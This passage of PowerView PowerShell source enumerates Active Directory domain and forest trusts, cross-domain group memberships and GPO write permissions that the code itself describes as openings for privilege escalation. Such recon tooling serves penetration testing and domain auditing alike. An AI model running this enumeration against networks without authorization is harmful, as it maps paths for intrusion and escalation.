$Domain.Trim() -ne '') {\n                $TargetDC = $Domain\n            }\n            else {\n                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior\n                $TargetDC = $Null\n            }\n\n            # arguments for DsEnumerateDomainTrusts\n            $PtrInfo = [IntPtr]::Zero\n\n            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND\n            $Flags = 63\n            $DomainCount = 0\n\n            # get the trust information from the target server\n            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)\n\n            # Locate the offset of the initial intPtr\n            $Offset = $PtrInfo.ToInt64()\n\n            # 0 = success\n            if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                # Work out how much to increment the pointer by finding out the size of the structure\n                $Increment = $DS_DOMAIN_TRUSTS::GetSize()\n\n                # parse all the result structures\n                for ($i = 0; ($i -lt $DomainCount); $i++) {\n                    # create a new int ptr at the given offset and cast the pointer as our result structure\n                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS\n\n                    $Offset = $NewIntPtr.ToInt64()\n                    $Offset += $Increment\n\n                    $SidString = ''\n                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n                    if ($Result -eq 0) {\n                        Write-Verbose \"[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n                    }\n                    else {\n                        $DomainTrust = New-Object PSObject\n                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain\n                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName\n                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName\n                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags\n                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex\n                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType\n                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes\n                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString\n                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid\n                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')\n                        $DomainTrust\n                    }\n                }\n                # free up the result buffer\n                $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n            }\n            else {\n                Write-Verbose \"[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n            }\n        }\n        else {\n            # if we're searching for domain trusts through .NET methods\n            $FoundDomain = Get-Domain @NetSearcherArguments\n            if ($FoundDomain) {\n                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {\n                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')\n                    $_\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-ForestTrust {\n<#\n.SYNOPSIS\n\nReturn all forest trusts for the current forest or a specified forest.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Forest  \n\n.DESCRIPTION\n\nThis function will enumerate domain trust relationships for the current (or a remote)\nforest using number of method using the .NET method GetAllTrustRelationships() on a\nSystem.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.\n\n.PARAMETER Forest\n\nSpecifies the forest to query for trusts, defaults to the current forest.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-ForestTrust\n\nReturn current forest trusts.\n\n.EXAMPLE\n\nGet-ForestTrust -Forest \"external.local\"\n\nReturn trusts for the \"external.local\" forest.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-ForestTrust -Forest \"external.local\" -Credential $Cred\n\nReturn trusts for the \"external.local\" forest using the specified alternate credenitals.\n\n.OUTPUTS\n\nPowerView.DomainTrust.NET\n\nA TrustRelationshipInformationCollection returned when using .NET methods (default).\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ForestTrust.NET')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Forest,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $NetForestArguments = @{}\n        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }\n        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }\n\n        $FoundForest = Get-Forest @NetForestArguments\n\n        if ($FoundForest) {\n            $FoundForest.GetAllTrustRelationships() | ForEach-Object {\n                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')\n                $_\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainForeignUser {\n<#\n.SYNOPSIS\n\nEnumerates users who are in groups outside of the user's domain.\nThis is a domain's \"outgoing\" access.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain, Get-DomainUser  \n\n.DESCRIPTION\n\nUses Get-DomainUser to enumerate all users for the current (or target) domain,\nthen calculates the given user's domain name based on the user's distinguishedName.\nThis domain name is compared to the queried domain, and the user object is\noutput if they differ.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainForeignUser\n\nReturn all users in the current domain who are in groups not in the\ncurrent domain.\n\n.EXAMPLE\n\nGet-DomainForeignUser -Domain dev.testlab.local\n\nReturn all users in the dev.testlab.local domain who are in groups not in the\ndev.testlab.local domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred\n\nReturn all users in the dev.testlab.local domain who are in groups not in the\ndev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and\nusing the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.ForeignUser\n\nCustom PSObject with translated user property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ForeignUser')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        $SearcherArguments['LDAPFilter'] = '(memberof=*)'\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }\n    }\n\n    PROCESS {\n        Get-DomainUser @SearcherArguments  | ForEach-Object {\n            ForEach ($Membership in $_.memberof) {\n                $Index = $Membership.IndexOf('DC=')\n                if ($Index) {\n\n                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'\n                    $UserDistinguishedName = $_.distinguishedname\n                    $UserIndex = $UserDistinguishedName.IndexOf('DC=')\n                    $UserDomain = $($_.distinguishedname.SubString($UserIndex)) -replace 'DC=','' -replace ',','.'\n\n                    if ($GroupDomain -ne $UserDomain) {\n                        # if the group domain doesn't match the user domain, display it\n                        $GroupName = $Membership.Split(',')[0].split('=')[1]\n                        $ForeignUser = New-Object PSObject\n                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $UserDomain\n                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname\n                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname\n                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain\n                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName\n                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership\n                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')\n                        $ForeignUser\n                    }\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainForeignGroupMember {\n<#\n.SYNOPSIS\n\nEnumerates groups with users outside of the group's domain and returns\neach foreign member. This is a domain's \"incoming\" access.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain, Get-DomainGroup  \n\n.DESCRIPTION\n\nUses Get-DomainGroup to enumerate all groups for the current (or target) domain,\nthen enumerates the members of each group, and compares the member's domain\nname to the parent group's domain name, outputting the member if the domains differ.\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainForeignGroupMember\n\nReturn all group members in the current domain where the group and member differ.\n\n.EXAMPLE\n\nGet-DomainForeignGroupMember -Domain dev.testlab.local\n\nReturn all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred\n\nReturn all group members in the dev.testlab.local domain where the member is\nnot in dev.testlab.local. binding to the secondary.dev.testlab.local for\nqueries, and using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.ForeignGroupMember\n\nCustom PSObject with translated group member property fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ForeignGroupMember')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('Name')]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $SearcherArguments = @{}\n        $SearcherArguments['LDAPFilter'] = '(member=*)'\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }\n        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }\n    }\n\n    PROCESS {\n        # standard group names to ignore\n        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')\n\n        Get-DomainGroup @SearcherArguments | Where-Object { $ExcludeGroups -notcontains $_.samaccountname } | ForEach-Object {\n            $GroupName = $_.samAccountName\n            $GroupDistinguishedName = $_.distinguishedname\n            $GroupDomain = $GroupDistinguishedName.SubString($GroupDistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n\n            $_.member | ForEach-Object {\n                # filter for foreign SIDs in the cn field for users in another domain,\n                #   or if the DN doesn't end with the proper DN for the queried domain\n                $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'\n                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($GroupDomain -ne $MemberDomain)) {\n                    $MemberDistinguishedName = $_\n                    $MemberName = $_.Split(',')[0].split('=')[1]\n\n                    $ForeignGroupMember = New-Object PSObject\n                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $GroupDomain\n                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName\n                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName\n                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain\n                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName\n                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName\n                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')\n                    $ForeignGroupMember\n                }\n            }\n        }\n    }\n}\n\n\nfunction Get-DomainTrustMapping {\n<#\n.SYNOPSIS\n\nThis function enumerates all trusts for the current domain and then enumerates\nall trusts for each domain it finds.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  \n\n.DESCRIPTION\n\nThis function will enumerate domain trust relationships for the current domain using\na number of methods, and then enumerates all trusts for each found domain, recursively\nmapping all reachable trust relationships. By default, and LDAP search using the filter\n'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified\nLDAP is used as well. If the -NET flag is specified, the .NET method\nGetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain\nobject. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is\nused to enumerate instead. If any \n\n.PARAMETER API\n\nSwitch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the\nbuilt-in LDAP method.\n\n.PARAMETER NET\n\nSwitch. Use .NET queries to enumerate trusts instead of the default LDAP method.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainTrustMapping | Export-CSV -NoTypeInformation trusts.csv\n\nMap all reachable domain trusts using .NET methods and output everything to a .csv file.\n\n.EXAMPLE\n\nGet-DomainTrustMapping -API | Export-CSV -NoTypeInformation trusts.csv\n\nMap all reachable domain trusts using Win32 API calls and output everything to a .csv file.\n\n.EXAMPLE\n\nGet-DomainTrustMapping -NET | Export-CSV -NoTypeInformation trusts.csv\n\nMap all reachable domain trusts using .NET methods and output everything to a .csv file.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-DomainTrustMapping -Server 'PRIMARY.testlab.local' | Export-CSV -NoTypeInformation trusts.csv\n\nMap all reachable domain trusts using LDAP, binding to the PRIMARY.testlab.local server for queries\nusing the specified alternate credentials, and output everything to a .csv file.\n\n.OUTPUTS\n\nPowerView.DomainTrust.LDAP\n\nCustom PSObject with translated domain LDAP trust result fields (default).\n\nPowerView.DomainTrust.NET\n\nA TrustRelationshipInformationCollection returned when using .NET methods.\n\nPowerView.DomainTrust.API\n\nCustom PSObject with translated domain API trust result fields.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.DomainTrust.NET')]\n    [OutputType('PowerView.DomainTrust.LDAP')]\n    [OutputType('PowerView.DomainTrust.API')]\n    [CmdletBinding(DefaultParameterSetName = 'LDAP')]\n    Param(\n        [Parameter(ParameterSetName = 'API')]\n        [Switch]\n        $API,\n\n        [Parameter(ParameterSetName = 'NET')]\n        [Switch]\n        $NET,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Parameter(ParameterSetName = 'API')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Switch]\n        $Tombstone,\n\n        [Parameter(ParameterSetName = 'LDAP')]\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    # keep track of domains seen so we don't hit infinite recursion\n    $SeenDomains = @{}\n\n    # our domain status tracker\n    $Domains = New-Object System.Collections.Stack\n\n    $DomainTrustArguments = @{}\n    if ($PSBoundParameters['API']) { $DomainTrustArguments['API'] = $API }\n    if ($PSBoundParameters['NET']) { $DomainTrustArguments['NET'] = $NET }\n    if ($PSBoundParameters['LDAPFilter']) { $DomainTrustArguments['LDAPFilter'] = $LDAPFilter }\n    if ($PSBoundParameters['Properties']) { $DomainTrustArguments['Properties'] = $Properties }\n    if ($PSBoundParameters['SearchBase']) { $DomainTrustArguments['SearchBase'] = $SearchBase }\n    if ($PSBoundParameters['Server']) { $DomainTrustArguments['Server'] = $Server }\n    if ($PSBoundParameters['SearchScope']) { $DomainTrustArguments['SearchScope'] = $SearchScope }\n    if ($PSBoundParameters['ResultPageSize']) { $DomainTrustArguments['ResultPageSize'] = $ResultPageSize }\n    if ($PSBoundParameters['ServerTimeLimit']) { $DomainTrustArguments['ServerTimeLimit'] = $ServerTimeLimit }\n    if ($PSBoundParameters['Tombstone']) { $DomainTrustArguments['Tombstone'] = $Tombstone }\n    if ($PSBoundParameters['Credential']) { $DomainTrustArguments['Credential'] = $Credential }\n\n    # get the current domain and push it onto the stack\n    if ($PSBoundParameters['Credential']) {\n        $CurrentDomain = (Get-Domain -Credential $Credential).Name\n    }\n    else {\n        $CurrentDomain = (Get-Domain).Name\n    }\n    $Domains.Push($CurrentDomain)\n\n    while($Domains.Count -ne 0) {\n\n        $Domain = $Domains.Pop()\n\n        # if we haven't seen this domain before\n        if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {\n\n            Write-Verbose \"[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'\"\n\n            # mark it as seen in our list\n            $Null = $SeenDomains.Add($Domain, '')\n\n            try {\n                # get all the trusts for this domain\n                $DomainTrustArguments['Domain'] = $Domain\n                $Trusts = Get-DomainTrust @DomainTrustArguments\n\n                if ($Trusts -isnot [System.Array]) {\n                    $Trusts = @($Trusts)\n                }\n\n                # get any forest trusts, if they exist\n                if ($PsCmdlet.ParameterSetName -eq 'NET') {\n                    $ForestTrustArguments = @{}\n                    if ($PSBoundParameters['Forest']) { $ForestTrustArguments['Forest'] = $Forest }\n                    if ($PSBoundParameters['Credential']) { $ForestTrustArguments['Credential'] = $Credential }\n                    $Trusts += Get-ForestTrust @ForestTrustArguments\n                }\n\n                if ($Trusts) {\n                    if ($Trusts -isnot [System.Array]) {\n                        $Trusts = @($Trusts)\n                    }\n\n                    # enumerate each trust found\n                    ForEach ($Trust in $Trusts) {\n                        if ($Trust.SourceName -and $Trust.TargetName) {\n                            # make sure we process the target\n                            $Null = $Domains.Push($Trust.TargetName)\n                            $Trust\n                        }\n                    }\n                }\n            }\n            catch {\n                Write-Verbose \"[Get-DomainTrustMapping] Error: $_\"\n            }\n        }\n    }\n}\n\n\nfunction Get-GPODelegation {\n<#\n.SYNOPSIS\n\nFinds users with write permissions on GPO objects which may allow privilege escalation within the domain.\n\nAuthor: Itamar Mizrahi (@MrAnde7son)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.PARAMETER GPOName\n\nThe GPO display name to query for, wildcards accepted.\n\n.PARAMETER PageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.EXAMPLE\n\nGet-GPODelegation\n\nReturns all GPO delegations in current forest.\n\n.EXAMPLE\n\nGet-GPODelegation -GPOName\n\nReturns all GPO delegations on a given GPO.\n#>\n\n    [CmdletBinding()]\n    Param (\n        [String]\n        $GPOName = '*',\n\n        [ValidateRange(1,10000)] \n        [Int]\n        $PageSize = 200\n    )\n\n    $Exclusions = @('SYSTEM','Domain Admins','Enterprise Admins')\n\n    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\n    $DomainList = @($Forest.Domains)\n    $Domains = $DomainList | foreach { $_.GetDirectoryEntry() }\n    foreach ($Domain in $Domains) {\n        $Filter = \"(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))\"\n        $Searcher = New-Object System.DirectoryServices.DirectorySearcher\n        $Searcher.SearchRoot = $Domain\n        $Searcher.Filter = $Filter\n        $Searcher.PageSize = $PageSize\n        $Searcher.SearchScope = \"Subtree\"\n        $listGPO = $Searcher.FindAll()\n        foreach ($gpo in $listGPO){\n            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match \"Write\" -and $_.AccessControlType -eq \"Allow\" -and  $Exclusions -notcontains $_.IdentityReference.toString().split(\"\\\")[1] -and $_.IdentityReference -ne \"CREATOR OWNER\"}\n        if ($ACL -ne $null){\n            $GpoACL = New-Object psobject\n            $GpoACL | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath\n            $GpoACL | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname\n            $GpoACL | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference\n            $GpoACL | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights\n            $GpoACL\n        }\n        }\n    }\n}\n\n\n########################################################\n#\n# Expose the Win32API functions and datastructures below\n# using PSReflect.\n# Warning: Once these are executed, they are baked in\n# and can't be changed while the script is running!\n#\n########################################################\n\n$Mod = New-InMemoryModule -ModuleName Win32\n\n# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]\n\n# used to parse the 'samAccountType' property for users/computers/groups\n$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{\n    DOMAIN_OBJECT                   =   '0x00000000'\n    GROUP_OBJECT                    =   '0x10000000'\n    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'\n    ALIAS_OBJECT                    =   '0x20000000'\n    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'\n    USER_OBJECT                     =   '0x30000000'\n    MACHINE_ACCOUNT                 =   '0x30000001'\n    TRUST_ACCOUNT                   =   '0x30000002'\n    APP_BASIC_GROUP                 =   '0x40000000'\n    APP_QUERY_GROUP                 =   '0x40000001'\n    ACCOUNT_TYPE_MAX                =   '0x7fffffff'\n}\n\n# used to parse the 'grouptype' property for groups\n$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{\n    CREATED_BY_SYSTEM               =   '0x00000001'\n    GLOBAL_SCOPE                    =   '0x00000002'\n    DOMAIN_LOCAL_SCOPE              =   '0x00000004'\n    UNIVERSAL_SCOPE                 =   '0x00000008'\n    APP_BASIC                       =   '0x00000010'\n    APP_QUERY                       =   '0x00000020'\n    SECURITY                        =   '0x80000000'\n} -Bitfield\n\n# used to parse the 